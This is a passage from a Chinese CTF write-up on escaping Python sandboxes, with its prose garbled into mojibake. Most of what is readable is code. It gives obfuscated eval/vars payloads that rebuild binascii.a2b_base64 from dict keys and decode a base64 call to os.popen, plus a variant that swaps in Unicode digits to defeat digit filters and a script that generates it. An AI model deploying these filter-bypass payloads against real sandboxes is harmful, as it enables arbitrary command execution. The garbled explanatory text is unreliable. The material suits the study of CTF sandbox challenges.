eval(vars(eval(list(dict(_1_1i1m1p1o1r1t1_1_=1))[0][::2])(list(dict(b_i_n_a_s_c_i_i_=1))[0][::2]))[list(dict(a_2_b1_1b_a_s_e_6_4=1))[0][::2]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=1))[0]))
```

ç›¸æ¯”ä¸Šé¢çš„ payload æ¥è¯´ï¼Œå®ƒè¿˜ä¸éœ€è¦ `for`ï¼Œéå¸¸çº¯å‡€çš„é€šè§£ ![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/6-1664366598.png)

### ğŸŒ§ é€šè§£å››

å†ç–¯ç‹‚ä¸€ç‚¹ï¼Œå¦‚æœæŠŠæ•°å­—ç¦ç”¨äº†ï¼Œå¦‚ä½•ï¼Ÿ

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/8-1664366600.jpeg)

è¿™å°±æ˜¯ã€ŠOrangeKiller CTF ç¬¬ 3 æœŸã€‹ä¸­çš„ç¬¬ä¸‰é“é¢˜ã€‚

åˆ‡ç‰‡ä¸­çš„æ•°å­—å¥½è¯´ï¼š

- `0` -> `len([])`
- `2` -> `len(list(dict(aa=()))[len([])])`

ç”±äºæˆ‘é€‰ç”¨çš„æ˜¯ `dict()`ï¼Œå‚æ•°é‡Œçš„æ•°å­—åº”è¯¥å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿç­”æ¡ˆè¿˜æ˜¯ Unicodeï¼å¯ç”¨çš„æ•°å­—åˆ—è¡¨è§ï¼š

https://www.fileformat.info/info/unicode/category/Nd/list.htm

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/5-1664366601.png)

æ‰€ä»¥ï¼Œç»ˆæç‰ˆçš„ payload å¦‚ä¸‹ï¼š

```
vars(eval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_ğŸ¤_bğŸ£_ğŸ£b_a_s_e_ğŸ¨_ğŸ¦=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(XğŸ£ğŸ«pbXBvcnRfXygnbğŸ¥MnKSğŸ§wbğŸ¥BlbignZWNobyBIYWNrZWQğŸ¨IGBpZGAnKSğŸ§yZWFkKCkg=()))[len([])])
```

å…¶ä¸­éœ€è¦ç”¨åˆ°çš„å­—ç¬¦ï¼š

```
In [5]: set(re.findall('w+', CMD))
Out[5]:
{'XğŸ£ğŸ«pbXBvcnRfXygnbğŸ¥MnKSğŸ§wbğŸ¥BlbignZWNobyBIYWNrZWQğŸ¨IGBpZGAnKSğŸ§yZWFkKCkg',
 '_a_aiamapaoarata_a_',
 'a_ğŸ¤_bğŸ£_ğŸ£b_a_s_e_ğŸ¨_ğŸ¦',
 'aa',
 'b_i_n_a_s_c_i_i_',
 'dict',
 'eval',
 'len',
 'list',
 'vars'}

In [6]: set(re.findall('W', CMD))
Out[6]: {'(', ')', ':', '=', '[', ']'}
```

æ„é€ è„šæœ¬ï¼š

```
u = 'ğŸ¢ğŸ£ğŸ¤ğŸ¥ğŸ¦ğŸ§ğŸ¨ğŸ©ğŸªğŸ«'

CMD = "eval(vars(eval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=()))[len([])]))"

CMD = CMD.translate({ord(str(i)): u[i] for i in range(10)})
```

æ€ä¸€ä¸ªåŠå­—äº†å¾— ![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/9-1664366603.png)

## â˜ï¸ æ€»ç»“

OrangeKiller CTF ç¬¬ 3 æœŸ æ‰€éœ€çš„çŸ¥è¯†ç‚¹ï¼Œå…¶å®éƒ½åœ¨è¿™ç¯‡æ–‡ç« é‡Œäº†ï¼Œæˆ‘å°±ä¸å•°å—¦äº†ã€‚

è¿™ç¯‡å†™å®Œä¹‹åé¡¿è§‰ç¥æ¸…æ°”çˆ½ã€‚ç°åœ¨ CTF ä¸­çš„ Python é¢˜è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ â€”â€” Web é¢˜ä¼¼ä¹è¿˜æ˜¯ PHP çš„å¤©ä¸‹ã€‚ä»€ä¹ˆæ—¶å€™ Python ä¹Ÿèƒ½åƒ PHP è¿™æ ·è¢«äººæ¢ç´¢å‡ºå„ç§å¥‡å¦™çš„åˆ©ç”¨å‘¢ï¼Ÿæœ¬æ–‡çš„å§¿åŠ¿ä¼¼ä¹å°šæœªæœ‰å‰äººæ¢ç´¢ï¼Œæˆ–è®¸ä¹Ÿç®—ä¸º Python çš„å¥‡æŠ€æ·«å·§å…±äº«å‡ºå±äºè‡ªå·±çš„ä¸€å°ä»½åŠ›é‡äº† ![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/5-1664366604.png)